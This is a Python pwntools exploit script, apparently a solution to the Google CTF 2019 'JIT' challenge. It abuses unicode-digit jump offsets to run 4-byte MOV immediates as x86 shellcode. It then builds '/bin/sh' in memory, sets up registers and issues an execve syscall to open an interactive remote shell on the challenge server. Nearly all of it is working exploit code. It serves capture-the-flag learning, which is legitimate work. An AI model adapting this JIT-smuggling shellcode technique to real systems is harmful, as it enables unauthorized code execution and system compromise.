# Reference: https://cr0wn.uk/2019/google-jit/
import pwn

def find_valid_jump(instrno):
    for i in range(500):
       out = (i - instrno) * 5 - 5
       byte = out & 0xff
       if byte == 0x01:
           return i
    return None

def encode_instructions(asm_str):
    shellcode = pwn.asm(asm_str)
    
    if len(shellcode) > 4:
        pwn.log.error('shellcode {shellcode} is too long, shorten it to 4 bytes or less'.format(shellcode=shellcode))
    return pwn.u32(shellcode.ljust(4, b'\x00'))

def intbracket(s):
    ret = 0
    for c in s:
        ret = ret * 10 + ord(c) - 0x30
    return ret

def find_valid_unicode_jump(instrno):
    prefix = '' 
    ret = ''

    for k in range(10):
        for i in range(100):
            ret = prefix + str(i)
            out = (intbracket(ret) - instrno) * 5 - 5
            byte = out & 0xff
            if byte == 0x01:
                """workaround of encoding issue"""
                return '\uff10' * k + str(i) #str(ret.encode()[ret.encode().rfind(b'\x90')+1:].decode())
                #return ret
        prefix += "\xef\xbc\x90" # '\uff10'.encode()
        #prefix += '\uff10'
    return None

#for i in range(5):
#    print(i, find_valid_jump(i))

#print(encode_instructions('pop eax;pop ebx'))
host = 'jit.ctfcompetition.com'
port = 1337
jmp = find_valid_jump(1)
shellcode = encode_instructions("pop eax;pop ebx;pop ecx;pop edx")
shellcode = encode_instructions("pop eax;pop ebx") # shorter shellcodeuctions
"""
https://defuse.ca/online-x86-assembler.htm#disassembly

Assembly
Raw Hex (zero bytes in bold): 415458   
String Literal: "\x41\x54\x58"
Array Literal: { 0x41, 0x54, 0x58 }
Disassembly:
0:  41 54                   push   r12
2:  58                      pop    rax
"""
shellcode = pwn.u32('\x41\x54\x58'.ljust(4,'\x00')) # relocation
"""
https://defuse.ca/online-x86-assembler.htm#disassembly

Assembly
Raw Hex (zero bytes in bold):5658   
String Literal: "\x56\x58"
Array Literal: { 0x56, 0x58 }
Disassembly:
0:  56                      push   rsi
1:  58                      pop    rax
"""
shellcode = pwn.u32('\x56\x58'.ljust(4,'\x00')) # relocation, shorter

def dryrun():
    print('JMP({})'.format(jmp))
    print('MOV(A, {})'.format(shellcode))
    print('RET()')
    print('')

def jumper(conn):
    conn.writeline('JMP({})'.format(jmp))
    conn.writeline('MOV(A, {})'.format(shellcode))
    conn.writeline('RET()')
    conn.writeline('')

def spawn_shell(conn):
    conn.writeline('JMP({})'.format(find_valid_unicode_jump(0)))
    """
    Assembly
    Raw Hex (zero bytes in bold):5658   
    String Literal: "\x56\x58"
    Array Literal: { 0x56, 0x58 }
    Disassembly:
    0:  56                      push   rsi
    1:  58                      pop    rax
    """
    #conn.writeline('MOV(A, {})'.format(pwn.u32('\x56\x58'.ljust(4, '\x00'))))
    conn.writeline('MOV(A, {})'.format(pwn.u32(pwn.asm('push esi;pop eax').ljust(4, b'\x00'))))

    """
    ecx is used to limit times of loop, in the compiler, it is set to 10000, which is not enough.
    we need to change it to 0 to allow 2^64 times of jumps.

    Assembly
    Raw Hex (zero bytes in bold): 31C9   
    String Literal: "\x31\xC9"
    Array Literal: { 0x31, 0xC9 }
    Disassembly:
    0:  31 c9                   xor    ecx,ecx
    """
    conn.writeline('JMP({})'.format(find_valid_unicode_jump(2)))
    conn.writeline('MOV(A, {})'.format(pwn.u32(pwn.asm('xor ecx, ecx').ljust(4, b'\x00')))) # xor ecx, ecx

    """Load '/bin' to position 0
    >>> pwn.u32('/bin')
    1852381476
    
    1852381476 = 99999 * 18524 + 18699
    """
    conn.writeline('MOV(A, 0)')
    conn.writeline('STR(A, 10)')
    conn.writeline('MOV(A, 18699)')
    conn.writeline('STR(A, 0)')
    conn.writeline('LDR(A, 0)')
    conn.writeline('ADD(A, 99999)')
    conn.writeline('STR(A, 0)')
    conn.writeline('LDR(A, 10)')
    conn.writeline('ADD(A, 1)')
    conn.writeline('STR(A, 10)')
    conn.writeline('CMP(A, 18524)')
    conn.writeline('JNE(8)')

    """Load '/sh' to position 1
    >>> pwn.u32('/sh'.ljust(4,'\x00')
    6845231

    6845231 = 45299 + 99999 * 68
    """
    conn.writeline('MOV(A, 0)')
    conn.writeline('STR(A, 10)')
    conn.writeline('MOV(A, 45299)')
    conn.writeline('STR(A, 1)')
    conn.writeline('LDR(A, 1)')
    conn.writeline('ADD(A, 99999)')
    conn.writeline('STR(A, 1)')
    conn.writeline('LDR(A, 10)')
    conn.writeline('ADD(A, 1)')
    conn.writeline('STR(A, 10)')
    conn.writeline('CMP(A, 68)')
    conn.writeline('JNE(20)')

    """
    eax is no longer point to data segment, fix it to prevent segfault
    """
    conn.writeline('JMP({})'.format(find_valid_unicode_jump(28)))
    #conn.writeline('MOV(A, {})'.format(pwn.u32('\x56\x58'.ljust(4, '\x00')))) # push rsi; pop rax
    conn.writeline('MOV(A, {})'.format(pwn.u32(pwn.asm('push esi;pop eax').ljust(4, b'\x00'))))

    """
    store pointer to /bin/sh to rdi 

    Assembly
    Raw Hex (zero bytes in bold): 565F   
    String Literal: "\x56\x5F"
    Array Literal: { 0x56, 0x5F }
    Disassembly:
    0:  56                      push   rsi
    1:  5f                      pop    rdi
    """
    conn.writeline('JMP({})'.format(find_valid_unicode_jump(30)))
    #conn.writeline('MOV(A, {})'.format(pwn.u32('\x56\x5f'.ljust(4, '\x00')))) # push rsi; pop rdi
    conn.writeline('MOV(A, {})'.format(pwn.u32(pwn.asm('push esi;pop edi').ljust(4, b'\x00'))))

    """
    set rsi and rdx to null

    Assembly
    Raw Hex (zero bytes in bold): 4831F6   
    String Literal: "\x48\x31\xF6"
    Array Literal: { 0x48, 0x31, 0xF6 }
    Disassembly:
    0:  48 31 f6                xor    rsi,rsi



    Assembly
    Raw Hex (zero bytes in bold): 4831D2   
    String Literal: "\x48\x31\xD2"
    Array Literal: { 0x48, 0x31, 0xD2 }
    Disassembly:
    0:  48 31 d2                xor    rdx,rdx
    """
    conn.writeline('JMP('+format(find_valid_unicode_jump(32))+')')
    #conn.writeline('MOV(A, {})'.format(pwn.u32('\x48\x31\xF6'.ljust(4, '\x00')))) # xor rsi, rsi
    conn.writeline('MOV(A, {})'.format(pwn.u32(pwn.asm('xor esi, esi').ljust(4, b'\x00')))) # xor rsi, rsi

    conn.writeline('JMP({})'.format(find_valid_unicode_jump(34)))
    #conn.writeline('MOV(A, {})'.format(pwn.u32('\x48\x31\xD2'.ljust(4, '\x00')))) # xor rdx, rdx
    conn.writeline('MOV(A, {})'.format(pwn.u32(pwn.asm('xor edx, edx').ljust(4, b'\x00')))) # xor edx, edx

    """
    to cause a execve syscall, set eax to 0x3b. to avoid breaking the instructions. we can't simply use
    MOV(A, 59).
    """
    conn.writeline('MOV(A, 59)')
    conn.writeline('JMP({})'.format(find_valid_unicode_jump(37)))
    conn.writeline('MOV(A, {})'.format(pwn.u32(pwn.asm('syscall').ljust(4, b'\x00')))) # syscall

    conn.writeline('LDR(A, 1)')
    conn.writeline('RET()')
    conn.writeline('')
    """
    to get the flag
    $ cat flag
    """
    conn.interactive()

def run_remote():
    conn = pwn.remote(host, port)
    # jumper(conn)
    spawn_shell(conn)

#dryrun()
#print(find_valid_unicode_jump(35))
print('JMP({})'.format(find_valid_unicode_jump(32)))
print('JMP({})'.format(find_valid_unicode_jump(37)))
#run_remote()
